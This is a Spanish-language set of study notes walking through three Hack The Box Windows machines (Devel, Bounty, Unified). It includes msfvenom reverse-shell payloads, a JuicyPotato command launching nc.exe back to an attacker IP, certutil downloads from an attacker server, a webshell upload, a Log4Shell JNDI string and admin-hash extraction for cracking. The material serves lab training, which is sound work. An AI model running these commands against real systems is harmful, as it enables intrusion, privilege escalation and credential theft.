---
tags:
  - Walkthroughs
---
# Walkthroughs — Windows

Basado en tus apuntes, con los comandos normalizados y algún añadido para que se entienda.
`[?]` = dato dudoso de la transcripción (verifícalo contra la máquina).

## Devel (HTB) — 21 FTP, 80 IIS
- El FTP sirve la raíz de IIS → subir webshell y obtener reverse
- `ftp anonymous@10.129.70.95` (`cd`/`dir`); `dirsearch -u http://10.129.70.95/aspnet_client`
- `put prueba.txt` para confirmar escritura
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.157 LPORT=6767 -f aspx > shell.aspx`
  ```
  use multi/handler
  set payload windows/meterpreter/reverse_tcp
  set ExitOnSession false
  exploit -j
  ```
- Alternativa: `msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=9999 -a x86 --platform windows -f aspx -o s.aspx`
- **Escalada:** `whoami /priv` → `SeImpersonatePrivilege` → JuicyPotato + `certutil` para subir el `.exe`
  - `jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\windows\Temp\nc.exe -e cmd.exe 10.10.14.157 5555" -t *`
  - CLSID → buscar en GitHub
  - *(Devel es Windows 7; la ruta clásica alternativa es un exploit de kernel como MS11-046 vía `local_exploit_suggester`.)*

## Bounty (HTB)
- `dirsearch -u http://... -e aspx,net,asp,txt,config`; Wappalyzer → IIS
- Burp Intruder con tipos de archivo → permite `.config` → subir `web.config` con webshell
- `/uploadedfiles/web.config?cmd=id`; reverse de PowerShell (url-encoded)
- `type c:\Users\merlin\Desktop\user.txt`
- **Escalada:** `whoami /priv` → JuicyPotato
  - `python3 -m http.server 8808`; `mkdir c:\Temp; cd c:\Temp`
  - `certutil -urlcache -split -f http://10.10.14.157/JuicyPotato.exe ip.exe`
  - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=443 -f exe -o reverse.exe`
  - `certutil ... -f http://.../reverse.exe rev.exe`; `nc -lvnp 443`; `ip.exe -t * -p rev.exe -l 443`

## Unified (HTB) — 8080, 22, 6789, 8443, 8843
- 8443: UniFi vulnerable a **Log4Shell** (JNDI/LDAP)
- Burp: User-Agent → `${jndi:ldap://10.10.14.212:1389/a3}`
- Infra JNDI-Exploit-Kit / marshalsec rogue-jndi + `nc -lvnp` (requiere `openjdk-11`)
- Dentro: `ps aux | grep mongo` → `mongo --host 127.0.0.1 --port 27117`
  (el puerto por defecto de la base de datos de UniFi es **27117**, no 27417)
  - `use ace; show collections; db.admin.find()` → hash del administrador (`x_shadow`)
  - Crackear el hash (UniFi usa SHA512-crypt → `hashcat -m 1800`; el apunte anotó `HMAC-SHA256`[?])

!!! note "Escalada en Windows"
    Para elegir la variante de Potato según el sistema, mira la chuleta de
    [Escalada de privilegios](../../chuletas/escalada.md).
